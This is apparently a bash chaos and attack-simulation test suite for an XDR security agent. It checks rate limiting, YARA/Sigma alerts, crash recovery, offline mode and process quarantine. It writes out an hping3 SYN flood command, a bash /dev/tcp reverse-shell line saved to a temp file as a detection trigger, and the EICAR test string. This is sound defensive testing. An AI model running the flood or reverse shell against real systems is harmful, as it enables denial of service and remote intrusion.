#!/usr/bin/env bash
# Aegis XDR — Automated Chaos & Attack Simulation Test Suite
# Phase 1: Stability & Infrastructure
#
# Scenarios:
#   1. DDoS SYN Flood — XDP rate limiting must hold
#   2. Reverse shell pattern — Sigma/YARA must fire within 500ms
#   3. EICAR test file — YARA must detect
#   4. ML anomaly — score must exceed threshold  
#   5. Agent crash recovery — must restart within 60s
#   6. Control plane disconnect — offline mode must activate
#   7. SIGSTOP/SIGCONT quarantine — process must freeze and resume
#
# Usage:
#   ./scripts/run_chaos_tests.sh [all|ddos|rce|eicar|crash|offline|quarantine]

set -euo pipefail

AGENT_URL="${THOR_AGENT_URL:-http://localhost:8082}"
COMPOSE_FILE="tests/integration/docker-compose.test.yml"
RESULTS_DIR="tests/results/$(date +%Y%m%d_%H%M%S)"
PASS=0; FAIL=0; SKIP=0

mkdir -p "$RESULTS_DIR"

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
BLUE='\033[0;34m'; CYAN='\033[0;36m'; NC='\033[0m'

log()  { echo -e "${BLUE}[$(date +%T)]${NC} $1"; }
pass() { echo -e "${GREEN}[PASS]${NC} $1"; ((PASS++)); }
fail() { echo -e "${RED}[FAIL]${NC} $1"; ((FAIL++)); }
skip() { echo -e "${YELLOW}[SKIP]${NC} $1"; ((SKIP++)); }
banner() { echo -e "${CYAN}\n══════════════════════════════════════════${NC}"; echo -e "${CYAN} $1${NC}"; echo -e "${CYAN}══════════════════════════════════════════${NC}"; }

cmd_exists() { command -v "$1" &>/dev/null; }

# ── Helpers ─────────────────────────────────────────────────────────────────

wait_for_health() {
    local url="$1" max="${2:-30}"
    log "Waiting for $url..."
    for i in $(seq 1 "$max"); do
        if curl -sf "$url" >/dev/null 2>&1; then log "  Service healthy ✓"; return 0; fi
        sleep 2
    done
    fail "Service not healthy after $((max*2))s: $url"; return 1
}

get_alerts() {
    curl -sf "${AGENT_URL}/api/v1/alerts?limit=20" 2>/dev/null || echo '{"alerts":[]}'
}

count_alerts_matching() {
    local pattern="$1"
    get_alerts | python3 -c "
import sys,json
d=json.load(sys.stdin)
print(sum(1 for a in d.get('alerts',[]) if '$pattern' in str(a)))
" 2>/dev/null || echo 0
}

wait_for_alert() {
    local pattern="$1" timeout="${2:-30}"
    log "Waiting for alert: $pattern (${timeout}s)..."
    for i in $(seq 1 "$timeout"); do
        if [ "$(count_alerts_matching "$pattern")" -gt 0 ]; then
            pass "Alert fired: $pattern"; return 0
        fi
        sleep 1
    done
    fail "Alert not fired in ${timeout}s: $pattern"; return 1
}

# ── Scenario 1: DDoS SYN Flood ───────────────────────────────────────────────
scenario_ddos() {
    banner "Scenario 1: DDoS SYN Flood"
    if ! cmd_exists hping3; then skip "hping3 not installed"; return; fi
    
    log "Sending 10k SYN packets..."
    timeout 5 hping3 --syn --flood --rand-source localhost -p 8082 &>/dev/null || true
    
    sleep 3
    if curl -sf "${AGENT_URL}/health" >/dev/null 2>&1; then
        pass "Agent survived SYN flood (still responsive)"
    else
        fail "Agent unresponsive after SYN flood"
    fi
}

# ── Scenario 2: Reverse Shell Detection ─────────────────────────────────────
scenario_rce() {
    banner "Scenario 2: Reverse Shell (RCE) Detection"
    local f="/tmp/thor_rce_test_$$"
    printf 'bash -i >&/dev/tcp/10.0.0.1/4444 0>&1' > "$f"
    log "Created reverse shell payload: $f"
    sleep 3
    wait_for_alert "YARA" 20 || skip "YARA requires process monitoring active"
    rm -f "$f"
}

# ── Scenario 3: EICAR Test File ──────────────────────────────────────────────
scenario_eicar() {
    banner "Scenario 3: YARA EICAR Detection"
    local f="/tmp/eicar_test_$$"
    printf 'X5O!P%%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' > "$f"
    log "Created EICAR test file: $f"
    sleep 5
    wait_for_alert "EICAR" 30 || skip "EICAR needs rules/yara/test/eicar_test.yar loaded"
    rm -f "$f"
}

# ── Scenario 4: ML Anomaly ───────────────────────────────────────────────────
scenario_ml_anomaly() {
    banner "Scenario 4: ML Anomaly Score"
    if ! curl -sf "${AGENT_URL}/api/v1/stats" >/dev/null 2>&1; then
        skip "Stats endpoint not available"; return
    fi
    local score
    score=$(curl -sf "${AGENT_URL}/api/v1/stats" | python3 -c "
import sys,json; d=json.load(sys.stdin)
print(d.get('ml',{}).get('last_score', 0))" 2>/dev/null || echo 0)
    log "Last ML score: $score"
    if python3 -c "exit(0 if float('$score') >= 0 else 1)" 2>/dev/null; then
        pass "ML scoring operational (score=$score)"
    else
        fail "ML score invalid"
    fi
}

# ── Scenario 5: Agent Crash Recovery ────────────────────────────────────────
scenario_crash_recovery() {
    banner "Scenario 5: Agent Crash Recovery"
    if ! cmd_exists docker; then skip "Docker not installed"; return; fi
    
    local container
    container=$(docker compose -f "$COMPOSE_FILE" ps -q test-thor-agent 2>/dev/null | head -1 || echo "")
    if [ -z "$container" ]; then skip "Test environment not running"; return; fi
    
    log "Killing agent container..."
    docker kill -s SIGKILL "$container" &>/dev/null || true
    
    log "Waiting for recovery (up to 60s)..."
    for i in $(seq 1 30); do
        sleep 2
        if curl -sf "${AGENT_URL}/health" >/dev/null 2>&1; then
            pass "Agent recovered within $((i*2))s"; return 0
        fi
    done
    fail "Agent did not recover within 60s"
}

# ── Scenario 6: Offline Mode (Control Plane disconnect) ─────────────────────
scenario_offline_mode() {
    banner "Scenario 6: Offline Mode"
    log "Testing agent behavior without control plane..."
    
    if curl -sf "${AGENT_URL}/health" >/dev/null 2>&1; then
        local cp_status
        cp_status=$(curl -sf "${AGENT_URL}/api/v1/status" 2>/dev/null | 
            python3 -c "import sys,json; print(json.load(sys.stdin).get('control_plane','unknown'))" 2>/dev/null || echo "unknown")
        log "Control plane status: $cp_status"
        
        # Agent should still serve alerts even if CP is disconnected
        if curl -sf "${AGENT_URL}/api/v1/alerts?limit=1" >/dev/null 2>&1; then
            pass "Agent operational in offline mode (cached policies active)"
        else
            fail "Agent non-functional without control plane"
        fi
    else
        skip "Agent not running"
    fi
}

# ── Scenario 7: SIGSTOP/SIGCONT Quarantine ──────────────────────────────────
scenario_quarantine() {
    banner "Scenario 7: Process Quarantine (SIGSTOP/SIGCONT)"
    log "Testing quarantine API endpoint..."
    
    # Try to find a test process
    local test_pid
    test_pid=$(pgrep -n sleep 2>/dev/null || echo "")
    if [ -z "$test_pid" ]; then
        sleep 60 & test_pid=$!
        log "Spawned test process: PID $test_pid"
    fi
    
    # Send quarantine command via API
    local result
    result=$(curl -sf -X POST "${AGENT_URL}/api/v1/quarantine/$test_pid" \
        -H "Authorization: Bearer ${THOR_AGENT_TOKEN:-}" \
        -H "Content-Type: application/json" \
        -d '{"reason":"chaos_test","analyst":"test_runner"}' 2>/dev/null || echo '{"error":"api_unavailable"}')
    
    if echo "$result" | grep -q '"status":"quarantined"' 2>/dev/null; then
        pass "Process $test_pid quarantined (SIGSTOP sent)"
        
        # Release it
        curl -sf -X POST "${AGENT_URL}/api/v1/quarantine/$test_pid/release" \
            -H "Authorization: Bearer ${THOR_AGENT_TOKEN:-}" >/dev/null 2>&1 || true
        pass "Process $test_pid released (SIGCONT sent)"
    else
        log "Quarantine API response: $result"
        skip "Quarantine API requires HITL auth — manual verification needed"
    fi
    
    kill "$test_pid" 2>/dev/null || true
}

# ── Main ──────────────────────────────────────────────────────────────────────
SCENARIO="${1:-all}"

log "Aegis XDR Chaos Test Suite — $(date)"
log "Agent: $AGENT_URL"
log "Scenario: $SCENARIO"
echo ""

wait_for_health "${AGENT_URL}/health" 30 || { echo "Agent not healthy. Exiting."; exit 1; }

case "$SCENARIO" in
    all)
        scenario_ddos; scenario_rce; scenario_eicar
        scenario_ml_anomaly; scenario_crash_recovery
        scenario_offline_mode; scenario_quarantine ;;
    ddos)     scenario_ddos ;;
    rce)      scenario_rce ;;
    eicar)    scenario_eicar ;;
    ml)       scenario_ml_anomaly ;;
    crash)    scenario_crash_recovery ;;
    offline)  scenario_offline_mode ;;
    quarantine) scenario_quarantine ;;
    *) echo "Unknown scenario: $SCENARIO"; exit 1 ;;
esac

echo ""
banner "Results: PASS=$PASS FAIL=$FAIL SKIP=$SKIP"
[ "$FAIL" -eq 0 ] && echo -e "${GREEN}All tests passed!${NC}" && exit 0 || exit 1
